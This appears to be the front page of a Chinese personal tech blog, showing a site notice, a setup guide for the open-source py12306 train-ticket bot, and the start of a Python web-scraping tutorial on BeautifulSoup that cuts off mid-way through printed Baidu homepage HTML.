<!DOCTYPE html>
<html lang="zh-Hans">
  <head><meta name="generator" content="Hexo 3.8.0"><meta charset="UTF-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">


<meta http-equiv="Cache-Control" content="no-transform">
<meta http-equiv="Cache-Control" content="no-siteapp">

<meta name="theme-color" content="#f8f5ec">
<meta name="msapplication-navbutton-color" content="#f8f5ec">
<meta name="apple-mobile-web-app-capable" content="yes">
<meta name="apple-mobile-web-app-status-bar-style" content="#f8f5ec">

<meta name="description" content="Jack of all trades and master of none."><link rel="alternate" href="/atom.xml" title="Aaron Li"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico?v=2.10.2">
<link rel="canonical" href="muzimz.cn/">

<link rel="stylesheet" type="text/css" href="/lib/fancybox/jquery.fancybox.css"><link rel="stylesheet" type="text/css" href="/lib/nprogress/nprogress.min.css">
<link rel="stylesheet" type="text/css" href="/css/style.css?v=2.10.2">

<script id="baidu_push">
(function(){
    var bp = document.createElement('script');
    var curProtocol = window.location.protocol.split(':')[0];
    if (curProtocol === 'https') {
        bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
    }
    else {
        bp.src = 'http://push.zhanzhang.baidu.com/push.js';
    }
    var s = document.getElementsByTagName("script")[0];
    s.parentNode.insertBefore(bp, s);
})();
</script>
<script>
  window.config = {"leancloud":{"app_id":null,"app_key":null},"toc":true,"fancybox":true,"pjax":true};
</script>

    <title>Aaron Li</title>
  </head>

  <body><div id="mobile-navbar" class="mobile-navbar">
  <div class="mobile-header-logo">
    <a href="/." class="logo">Aaron Li</a>
  </div>
  <div class="mobile-navbar-icon">
    <span></span>
    <span></span>
    <span></span>
  </div>
</div>

<nav id="mobile-menu" class="mobile-menu slideout-menu">
  <ul class="mobile-menu-list"><a href="/">
        <li class="mobile-menu-item">首页
          </li>
      </a></ul>
</nav>
<div class="container" id="mobile-panel">
      <header id="header" class="header"><div class="logo-wrapper">
  <a href="/." class="logo">Aaron Li</a>
</div>

<nav class="site-navbar"><ul id="menu" class="menu"><li class="menu-item">
          <a class="menu-item-link" href="/">
            首页
            </a>
        </li>
      </ul></nav>
</header>

      <main id="main" class="main">
        <div class="content-wrapper">
          <div id="content" class="content"><section id="posts" class="posts"><article class="post">
    <header class="post-header">
      <h1 class="post-title"><a class="post-link" href="/2018/09/26/本站须知/">本站须知</a>
        </h1>

      <div class="post-meta">
        <span class="post-time">
          2018-09-26
        </span></div>
    </header>

    <div class="post-content"><h1 id="阅前建议"><a href="#阅前建议" class="headerlink" title="阅前建议"></a>阅前建议</h1><p>本站所有内容建议务必在PC端进行阅读，手机端的阅读效果可能不佳，也许会影响到您的阅读体验，给您带来不便敬请谅解。</p>
<h1 id="免责声明"><a href="#免责声明" class="headerlink" title="免责声明"></a>免责声明</h1><p>本站部分所总结的内容涉及到Kali渗透，具有一定的攻击行为，所以仅供博主记录之用，切勿用于非法操作，一切后果由使用者本人自负。</p>
<h1 id="博主希望"><a href="#博主希望" class="headerlink" title="博主希望"></a>博主希望</h1><p>本站所记录的内容没有特别标注的皆为博主日常学习所总结，欢迎各位的转载，转载时注明链接与作者即可。</p>
<p>本站转载文章会在醒目处留有说明，如有侵权还请联系。</p>
<p>如果本站内容能给你带来帮助那最好不过了，如果不喜欢的话也不要那个啥的，谢谢。</p>

        </div></article>
      <article class="post">
    <header class="post-header">
      <h1 class="post-title"><a class="post-link" href="/2019/02/13/12306自动化抢票/">12306自动化抢票</a>
        </h1>

      <div class="post-meta">
        <span class="post-time">
          2019-02-13
        </span><span class="post-category">
            <a href="/categories/爬虫/">爬虫</a>
            </span>
        </div>
    </header>

    <div class="post-content"><h2 id="瞎扯"><a href="#瞎扯" class="headerlink" title="瞎扯"></a>瞎扯</h2><p>不知不觉，这年也算是过完了。</p>
<p>于我而言，现在的春节似乎已经没有了幼时所应该感受到的乐趣。蓦然回首，往事历历在目，仍记得幼时的伙伴常常聚在一起玩卡牌、捡鞭炮、拜年….如今，这一切的一切都已成浮云，或许是因为我们感受到了生活、学习等带来的压力，在压力袭来的同时我们一步步的成长着，现在的我们必须学会某些事、承担某些事，所以幼时的无忧无虑现在是那么的奢侈。</p>
<p><img src="https://ss0.bdstatic.com/70cFuHSh_Q1YnxGkpoWK1HF6hhy/it/u=567216776,4167239058&fm=26&gp=0.jpg"></p>
<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>春节之后，大多数亲戚朋友都需要为了生活而奔波而远离家乡，前段时间有亲戚因购买不到南昌-深圳的车票而焦灼着。众所周知，12306的防爬措施是做的很极致的，曾经自己也尝试着使用python来写一个12306的抢票程序，耐于目前自己的能力以及时间受限，在验证过程中始终通过不了，而自己又没有足够的经济条件来使用打码平台，所以就尝试去github上搜索下相关12306抢票项目。果不其然，在github上就有这么一款12306抢票神器，使用之后然我欲罢不能，经过四天的努力终于帮亲戚抢到了3张南昌-深圳的车票。</p>
<p>前人栽树，后人乘凉。基于该神器的强大，所以想通过该文章记录一下使用方式，也方便后来者的较快的了解该项目，项目github仓库：<a href="https://github.com/pjialin/py12306" target="_blank" rel="noopener">https://github.com/pjialin/py12306</a>，在此，也感谢作者的用心良苦，希望这个工具能够帮助到大家。</p>
<h2 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h2><p>该项目需要在python3.6以上版本才能使用，操作系统windowns、linux、mac（亲测有效）都可以，这里我们使用windows为例。</p>
<ul>
<li>首先，我们需要前往github仓库下载下载该12306抢票项目（py12306），git的下载在这里就不再说明了，不清楚的可以跳至：<a href="https://jacklxj.github.io/2018/09/10/Hexo-Github%E5%BB%BA%E7%AB%99/" target="_blank" rel="noopener">Git安装</a>，安装好后我们通过如下命令来进行下载：</li>
</ul>
<figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git <span class="keyword">clone</span> <span class="title">https</span>://github.com/pjialin/py12306</span><br></pre></td></tr></table></figure>
<ul>
<li>在安装好python3.6以上版本之后，我们还需要安装其他支持工具，这里python建议下载Anaconda，下载及安装操作见：<a href="https://jacklxj.github.io/2018/09/23/Xshell远程连接linux并远程访问ipython服务/" target="_blank" rel="noopener">Anaconda下载及安装</a>，python安装好后，我们在终端执行如下命令来下载支持工具：</li>
</ul>
<figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">pip install redis==<span class="number">3.0</span><span class="number">.1</span></span><br><span class="line">pip install Flask-JWT-Extended==<span class="number">3.15</span><span class="number">.0</span></span><br><span class="line">pip install requests-html==<span class="number">0.9</span><span class="number">.0</span></span><br></pre></td></tr></table></figure>
<ul>
<li><p>随后，我们复制<code>/py12306/env.py.example</code>文件并将复制后的文件命名为<code>env.py</code>。</p>
</li>
<li><p>打开浏览器使用目标12306账号登录12306官网并添加抢票乘客（可多个，注意将身份证等信息填写正确，学生需要额外填写相关信息）。</p>
</li>
<li><p>使用sublime编辑器（亦或其他）打开上述复制的<code>env.py</code>文件，并将12306账号、车次、时间等信息配置完成，主要配置说明如下：</p>
</li>
</ul>
<figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><span class="line"># 设置一：<span class="number">12306</span>抢票账号</span><br><span class="line">USER_ACCOUNTS = [</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="string">'key'</span>: <span class="number">0</span>,  # <span class="number">12306</span>账号id1，用于区分不同抢票账号</span><br><span class="line">        <span class="string">'user_name'</span>: [username1],   # <span class="number">12306</span>账号用户名<span class="number">1</span></span><br><span class="line">        <span class="string">'password'</span>: [password1],   # <span class="number">12306</span>账号用户密码<span class="number">1</span></span><br><span class="line">    &#125;,</span><br><span class="line">    # &#123;</span><br><span class="line">    #     <span class="string">'key'</span>: <span class="number">2</span>,  # <span class="number">12306</span>账号id2</span><br><span class="line">    #     <span class="string">'user_name'</span>: [username2],     # 用户<span class="number">2</span></span><br><span class="line">    #     <span class="string">'password'</span>: [password2],    # 密码<span class="number">2</span></span><br><span class="line">    # &#125;,</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line"># 设置二： 打码平台，用于验证码识别</span><br><span class="line"># 打码平台账号</span><br><span class="line"># 目前只支持免费打码接口 和 若快打码，注册地址：http:<span class="comment">//www.ruokuai.com/login</span></span><br><span class="line">AUTO_CODE_PLATFORM = <span class="string">'free'</span>  # 免费填写 free 若快 ruokuai  # 免费打码无法保证持续可用，如失效请手动切换</span><br><span class="line">AUTO_CODE_ACCOUNT = &#123;  # 使用 free 可用省略</span><br><span class="line">    <span class="string">'user'</span>: <span class="string">'your user name'</span>,</span><br><span class="line">    <span class="string">'pwd'</span>: <span class="string">'your password'</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"># 设置三：邮箱配置，用于抢票成功通知</span><br><span class="line">EMAIL_ENABLED = <span class="number">1</span>  # 是否开启邮件通知</span><br><span class="line">EMAIL_SENDER = <span class="string">'XXX@qq.com'</span>  # 邮件发送者</span><br><span class="line">EMAIL_RECEIVER = [<span class="string">'XXX1@qq.com'</span>, <span class="string">'XXX2@qq.com'</span>]  # 邮件接受者，可以多个 </span><br><span class="line">EMAIL_SERVER_HOST = <span class="string">'smtp.qq.com'</span>  # 邮件服务 host</span><br><span class="line">EMAIL_SERVER_USER = <span class="string">'XXX@qq.com'</span>  # 邮件服务登录用户名，我在抢票的时候使用的是qq邮件服务，自行前往qq邮箱进行设置</span><br><span class="line">EMAIL_SERVER_PASSWORD = <span class="string">'password'</span>  # 邮件服务登录密码，qq邮箱设置完成之后会有一个密码，于此处填写即可</span><br><span class="line"></span><br><span class="line"># 设置四： web管理（flask）</span><br><span class="line">WEB_ENABLE = <span class="number">1</span>  # 是否打开 Web 管理</span><br><span class="line">WEB_USER = &#123;  # 登录信息</span><br><span class="line">    <span class="string">'username'</span>: <span class="string">'admin'</span>,</span><br><span class="line">    <span class="string">'password'</span>: <span class="string">'password'</span></span><br><span class="line">&#125;</span><br><span class="line">WEB_PORT = <span class="number">8008</span>  # 监听端口</span><br><span class="line"># 设置完成并程序运行之后，请求http:<span class="comment">//localhost:8008登录进行管理</span></span><br><span class="line"></span><br><span class="line"># 设置五：乘客信息设置</span><br><span class="line">QUERY_JOBS = [</span><br><span class="line">    &#123;</span><br><span class="line">        # <span class="string">'job_name'</span>:  <span class="string">'bj -&gt; sz'</span>,  # 任务名称，不填默认会以车站名命名，不可重复</span><br><span class="line">        <span class="string">'account_key'</span>: <span class="number">0</span>,  # 将会使用指定账号下单，于之前的<span class="number">12306</span>账号id对应</span><br><span class="line">        <span class="string">'left_dates'</span>: [  # 出发日期 :Array，可多选，按照自己的行程排序</span><br><span class="line">            <span class="string">"2019-02-16"</span>,</span><br><span class="line">            <span class="string">"2019-02-17"</span>,</span><br><span class="line">        ],</span><br><span class="line">        <span class="string">'stations'</span>: &#123;  # 车站 支持多个车站同时查询  :Dict or :List</span><br><span class="line">            <span class="string">'left'</span>: <span class="string">'亳州'</span>,     # 始发地</span><br><span class="line">            <span class="string">'arrive'</span>: <span class="string">'北京西'</span>,     # 目的地</span><br><span class="line">        &#125;,</span><br><span class="line">        #  # 多个车站示例  (建议添加多个，有时多买几站成功率会高一点)</span><br><span class="line">        # <span class="string">'stations'</span>: [&#123;</span><br><span class="line">        #     <span class="string">'left'</span>: <span class="string">'北京'</span>,</span><br><span class="line">        #     <span class="string">'arrive'</span>: <span class="string">'深圳'</span>,</span><br><span class="line">        # &#125;,&#123;  # 多个车站示例</span><br><span class="line">        #     <span class="string">'left'</span>: <span class="string">'北京'</span>,</span><br><span class="line">        #     <span class="string">'arrive'</span>: <span class="string">'广州'</span>,</span><br><span class="line">        # &#125;],</span><br><span class="line">        <span class="string">'members'</span>: [ </span><br><span class="line">            <span class="string">"张三"</span>,     # 乘客姓名，于之前<span class="number">12306</span>账号添加的乘客一致，可自动识别乘客类别</span><br><span class="line">        ],</span><br><span class="line">        <span class="string">'allow_less_member'</span>: <span class="number">0</span>,  # 是否允许余票不足时提交部分乘客</span><br><span class="line">        <span class="string">'seats'</span>: [  # 筛选座位，可多选，根据自己的倾向进行排序</span><br><span class="line">            # 可用值: 特等座, 商务座, 一等座, 二等座, 软卧, 硬卧, 动卧, 软座, 硬座, 无座</span><br><span class="line">            <span class="string">'硬卧'</span>,</span><br><span class="line">            # <span class="string">'软卧'</span>,</span><br><span class="line">        ],</span><br><span class="line">        <span class="string">'train_numbers'</span>: [  # 筛选车次 可以为空，为空则所有车次都可以提交 如 [] 注意大小写需要保持一致</span><br><span class="line">            <span class="string">"K148"</span>,</span><br><span class="line">            # <span class="string">"K1172"</span>,</span><br><span class="line">        ],</span><br><span class="line">        <span class="string">'except_train_numbers'</span>: [  # 筛选车次，排除车次  train_numbers 和 except_train_numbers 不可同时存在</span><br><span class="line">        ],</span><br><span class="line">        <span class="string">'period'</span>: &#123;  # 筛选时间</span><br><span class="line">            <span class="string">'from'</span>: <span class="string">'00:00'</span>,</span><br><span class="line">            <span class="string">'to'</span>: <span class="string">'24:00'</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;,</span><br><span class="line">   </span><br><span class="line">   # 如若有其他<span class="number">12306</span>账号进行抢票，可在此列表中进行添加，添加内容同上</span><br><span class="line">]</span><br></pre></td></tr></table></figure>
<ul>
<li>于此，该项目的设置基本完成，之后我们运行<code>main.py</code>主程序即可，命令如下：</li>
</ul>
<figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">cd</span> ./py12306 $$ <span class="keyword">python</span> main.<span class="keyword">py</span></span><br></pre></td></tr></table></figure>
<p>运行结果示例如下：<br><img src="https://gss0.baidu.com/94o3dSag_xI4khGko9WTAnF6hhy/zhidao/pic/item/024f78f0f736afc36188d855bd19ebc4b745127d.jpg" width="500"></p>
<h2 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h2><p>以上内容仅为该项目的部分功能，如若像了解该项目更多信息，可前往项目地址:<a href="https://github.com/pjialin/py12306" target="_blank" rel="noopener">py12306</a></p>
<p>py12306交流群：<a href="http://shang.qq.com/wpa/qunwpa?idkey=8eab0b6402096266a62263c1cd452149926adb5cba7a2b7a98a5adc65869addf" target="_blank" rel="noopener">274781597</a></p>
<p>最后，感谢作者的用心良苦，希望这个工具能够帮助到大家。</p>
<p><img src="https://ss1.bdstatic.com/70cFuXSh_Q1YnxGkpoWK1HF6hhy/it/u=214493079,1571383568&fm=26&gp=0.jpg"></p>

        </div></article>
      <article class="post">
    <header class="post-header">
      <h1 class="post-title"><a class="post-link" href="/2019/01/01/网页爬虫之页面解析/">网页爬虫之页面解析</a>
        </h1>

      <div class="post-meta">
        <span class="post-time">
          2019-01-01
        </span><span class="post-category">
            <a href="/categories/爬虫/">爬虫</a>
            </span>
        </div>
    </header>

    <div class="post-content"><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>With the rapid development of the Internet，越来越多的信息充斥着各大网络平台。正如<a href="https://baike.baidu.com/item/%E6%AD%BB%E4%BA%A1%E7%AC%94%E8%AE%B0/25476?fr=aladdin" target="_blank" rel="noopener">《死亡笔记》</a>中L·Lawliet这一角色所提到的<a href="https://baike.baidu.com/item/大数定律/410082?fr=aladdin" target="_blank" rel="noopener">大数定律</a>，在众多繁杂的数据中必然存在着某种规律，偶然中必然包含着某种必然的发生。不管是我们提到的大数定律，还是最近火热的大数据亦或其他领域都离不开大量而又干净数据的支持，为此，网络爬虫能够满足我们的需求，即在互联网上按照我们的意愿来爬取我们任何想要得到的信息，以便我们分析出其中的必然规律，进而做出正确的决策。同样，在我们平时上网的过程中，无时无刻可见爬虫的影子，比如我们广为熟知的“度娘”就是其中一个大型而又名副其实的“蜘蛛王”（SPIDER KING）。而要想写出一个强大的爬虫程序，则离不开熟练的对各种网络页面的解析，这篇文章将给读者介绍如何在Python中使用各大解析工具。</p>
<h2 id="内容扼要"><a href="#内容扼要" class="headerlink" title="内容扼要"></a>内容扼要</h2><p>常用的解析方式主要有正则、Beautiful Soup、XPath、pyquery，本文主要是讲解后三种工具的使用，而对正则表达式的使用不做讲解，对正则有兴趣了解的读者可以跳转：<a href="https://baike.baidu.com/item/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/1700215?fr=aladdin" target="_blank" rel="noopener">正则表达式</a></p>
<ul>
<li><a href="https://www.crummy.com/software/BeautifulSoup/bs4/doc/index.zh.html#contents-children" target="_blank" rel="noopener">Beautiful Soup</a>的使用</li>
<li><a href="https://www.w3.org/TR/xpath/all/" target="_blank" rel="noopener">XPath</a>的使用</li>
<li><a href="https://pythonhosted.org/pyquery/" target="_blank" rel="noopener">pyquery</a>的使用</li>
<li>Beautiful Soup、XPath、pyquery解析<a href="https://hr.tencent.com/" target="_blank" rel="noopener">腾讯招聘网</a>案例</li>
</ul>
<h2 id="Beautiful-Soup"><a href="#Beautiful-Soup" class="headerlink" title="Beautiful Soup"></a>Beautiful Soup</h2><p>Beautiful Soup是Python爬虫中针对HTML、XML的其中一个解析工具，熟练的使用之可以很方便的提取页面中我们想要的数据。此外，在Beautiful Soup中，为我们提供了以下四种解析器：</p>
<ul>
<li>标准库，<code>soup = BeautifulSoup(content, &quot;html.parser&quot;)</code></li>
<li>lxml解析器，<code>soup = BeautifulSoup(content, &quot;lxml&quot;)</code></li>
<li>xml解析器，<code>soup = BeautifulSoup(content, &quot;xml&quot;)</code></li>
<li>html5lib解析器，<code>soup = BeautifulSoup(content, &quot;html5lib&quot;)</code></li>
</ul>
<p>在以上四种解析库中，lxml解析具有解析速度快兼容错能力强的merits，所以本文主要使用的是lxml解析器，下面我们主要拿百度首页的html来具体讲解下Beautiful Soup的使用：</p>
<figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">from bs4 <span class="built_in">import</span> BeautifulSoup</span><br><span class="line"><span class="built_in">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="attr">__name__</span> == <span class="string">"__main__"</span>:</span><br><span class="line">    <span class="attr">response</span> = requests.get(<span class="string">"https://www.baidu.com"</span>)</span><br><span class="line">    <span class="attr">encoding</span> = response.apparent_encoding</span><br><span class="line">    response.<span class="attr">encoding</span> = encoding</span><br><span class="line">    print(BeautifulSoup(response.text, <span class="string">"lxml"</span>))</span><br></pre></td></tr></table></figure>
<p>代码解读：</p>
<ul>
<li><code>response = requests.get(&quot;https://www.baidu.com&quot;)</code>，requests请求百度链接</li>
<li><code>encoding = response.apparent_encoding</code>，获取页面编码格式</li>
<li><code>response.encoding = encoding</code>，修改请求编码为页面对应的编码格式，以避免乱码</li>
<li><code>print(BeautifulSoup(response.text, &quot;lxml&quot;))</code>，使用lxml解析器来对百度首页html进行解析并打印结果</li>
</ul>
<p>打印后的结果如下所示：</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="comment">&lt;!--STATUS OK--&gt;</span><span class="tag">&lt;<span class="name">html</span>&gt;</span> <span class="tag">&lt;<span class="name">head</span>&gt;</span><span class="tag">&lt;<span class="name">meta</span> <span class="attr">content</span>=<span class="string">"text/html;charset=utf-8"</span> <span class="attr">http-equiv</span>=<span class="string">"content-type"</span>/&gt;</span><span class="tag">&lt;<span class="name">meta</span> <span class="attr">content</span>=<span class="string">"IE=Edge"</span> <span class="attr">http-equiv</span>=<span class="string">"X-UA-Compatible"</span>/&gt;</span><span class="tag">&lt;<span class="name">meta</span> <span class="attr">content</span>=<span class="string">"always"</span> <span class="attr">name</span>=<span class="string">"referrer"</span>/&gt;</span><span class="tag">&lt;<span class="name">link</span> <span class="attr">href</span>=<span class="string">"https://ss1.bdstatic.com/5eN1bjq8AAUYm2zgoY3K/r/www/cache/bdorz/baidu.min.css"</span> <span class="attr">rel</span>=<span class="string">"stylesheet"</span> <span class="attr">type</span>=<span class="string">"text/css"</span>/&gt;</span><span class="tag">&lt;<span class="name">title</span>&gt;</span>百度一下，你就知道<span class="tag">&lt;/<span class="name">title</span>&gt;</span><span class="tag">&lt;/<span class="name">head</span>&gt;</span> <span class="tag">&lt;<span class="name">body</span> <span class="attr">link</span>=<span class="string">"#0000cc"</span>&gt;</span> <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"wrapper"</span>&gt;</span> <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"head"</span>&gt;</span> <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"head_wrapper"</span>&gt;</span> <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"s_form"</span>&gt;</span> <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"s_form_wrapper"</span>&gt;</span> <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"lg"</span>&gt;</span> <span class="tag">&lt;<span class="name">img</span> <span class="attr">height</span>=<span class="string">"129"</span> <span class="attr">hidefocus</span>=<span class="string">"true"</span> <span class="attr">src</span>=<span class="string">"//www.baidu.com/img/bd_logo1.png"</span> <span class="attr">width</span>=<span class="string">"270"</span>/&gt;</span> <span class="tag">&lt;/<span class="name">div</span>&gt;</span> <span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">"//www.baidu.com/s"</span> <span class="attr">class</span>=<span class="string">"fm"</span> <span class="attr">id</span>=<span class="string">"form"</span> <span class="attr">name</span>=<span class="string">"f"</span>&gt;</span> <span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">"bdorz_come"</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">value</span>=<span class="string">"1"</span>/&gt;</span> <span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">"ie"</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">value</span>=<span class="string">"utf-8"</span>/&gt;</span> <span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">"f"</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">value</span>=<span class="string">"8"</span>/&gt;</span> <span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">"rsv_bp"</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">value</span>=<span class="string">"1"</span>/&gt;</span> <span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">"rsv_idx"</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">value</span>=<span class="string">"1"</span>/&gt;</span> <span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">"tn"</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">value</span>=<span class="string">"baidu"</span>/&gt;</span><span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">"bg s_ipt_wr"</span>&gt;</span><span class="tag">&lt;<span class="name">input</span> <span class="attr">autocomplete</span>=<span class="string">"off"</span> <span class="attr">autofocus</span>=<span class="string">"autofocus"</span> <span class="attr">class</span>=<span class="string">"s_ipt"</span> <span class="attr">id</span>=<span class="string">"kw"</span> <span class="attr">maxlength</span>=<span class="string">"255"</span> <span class="attr">name</span>=<span class="string">"wd"</span> <span class="attr">value</span>=<span class="string">""</span>/&gt;</span><span class="tag">&lt;/<span class="name">span</span>&gt;</span><span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">"bg s_btn_wr"</span>&gt;</span><span class="tag">&lt;<span class="name">input</span> <span class="attr">autofocus</span>=<span class="string">""</span> <span class="attr">class</span>=<span class="string">"bg s_btn"</span> <span class="attr">id</span>=<span class="string">"su"</span> <span class="attr">type</span>=<span class="string">"submit"</span> <span class="attr">value</span>=<span class="string">"百度一下"</span>/&gt;</span><span class="tag">&lt;/<span class="name">span</span>&gt;</span> <span class="tag">&lt;/<span class="name">form</span>&gt;</span> <span class="tag">&lt;/<span class="name">div</span>&gt;</span> <span class="tag">&lt;/<span class="name">div</span>&gt;</span> <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"u1"</span>&gt;</span> <span class="tag">&lt;<span class="name">a</span> <span class="attr">class</span>=<span class="string">"mnav"</span> <span class="attr">href</span>=<span class="string">"http://news.baidu.com"</span> <span class="attr">name</span>=<span class="string">"tj_trnews"</span>&gt;</span>新闻<span class="tag">&lt;/<span class="name">a</span>&gt;</span> <span class="tag">&lt;<span class="name">a</span> <span class="attr">class</span>=<span class="string">"mnav"</span> <span class="attr">href</span>=<span class="string">"https://www.hao123.com"</span> <span class="attr">name</span>=<span class="string">"tj_trhao123"</span>&gt;</span>hao123<span class="tag">&lt;/<span class="name">a</span>&gt;</span> <span class="tag">&lt;<span class="name">a</span> <span class="attr">class</span>=<span class="string">"mnav"</span> <span class="attr">href</span>=<span class="string">"http://map.baidu.com"</span> <span class="attr">name</span>=<span class="string">"tj_trmap"</span>&gt;</span>地图<span class="tag">&lt;/<span class="name">a</span>&gt;</span> <span class="tag">&lt;<span class="name">a</span> <span class="attr">class</span>=<span class="string">"mnav"</span> <span class="attr">href</span>=<span class="string">"http://v.baidu.com"</span> <span class="attr">name</span>=<span class="string">"tj_trvideo"</span>&gt;</span>视频<span class="tag">&lt;/<span class="name">a</span>&gt;</span> <span class="tag">&lt;<span class="name">a</span> <span class="attr">class</span>=<span class="string">"mnav"</span> <span class="attr">href</span>=<span class="string">"http://tieba.baidu.com"</span> <span class="attr">name</span>=<span class="string">"tj_trtieba"</span>&gt;</span>贴吧<span class="tag">&lt;/<span class="name">a</span>&gt;</span> <span class="tag">&lt;<span class="name">noscript</span>&gt;</span> <span class="tag">&lt;<span class="name">a</span> <span class="attr">class</span>=<span class="string">"lb"</span> <span class="attr">href</span>=<span class="string">"http://www.baidu.com/bdorz/login.gif?login&amp;amp;tpl=mn&amp;amp;u=http%3A%2F%2Fwww.baidu.com%2f%3fbdorz_come%3d1"</span> <span class="attr">name</span>=<span class="string">"tj_login"</span>&gt;</span>登录<span class="tag">&lt;/<span class="name">a</span>&gt;</span> <span class="tag">&lt;/<span class="name">noscript</span>&gt;</span> <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"><span class="built_in">document</span>.write(<span class="string">'&lt;a href="http://www.baidu.com/bdorz/login.gif?login&amp;tpl=mn&amp;u='</span>+ <span class="built_in">encodeURIComponent</span>(<span class="built_in">window</span>.location.href+ (<span class="built_in">window</span>.location.search === <span class="string">""</span> ? <span class="string">"?"</span> : <span class="string">"&amp;"</span>)+ <span class="string">"bdorz_come=1"</span>)+ <span class="string">'" name="tj_login" class="lb"&gt;登录&lt;/a&gt;'</span>);</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="undefined">                </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span> <span class="tag">&lt;<span class="name">a</span> <span class="attr">class</span>=<span class="string">"bri"</span> <span class="attr">href</span>=<span class="string">"//www.baidu.com/more/"</span> <span class="attr">name</span>=<span class="string">"tj_briicon"</span> <span class="attr">style</span>=<span class="string">"display: block;"</span>&gt;</span>更多产品<span class="tag">&lt;/<span class="name">a</span>&gt;</span> <span class="tag">&lt;/<span class="name">div</span>&gt;</span> <span class="tag">&lt;/<span class="name">div</span>&gt;</span> <span class="tag">&lt;/<span class="name">div</span>&gt;</span> <span class="tag">&lt;<span class="name">div</span> <span 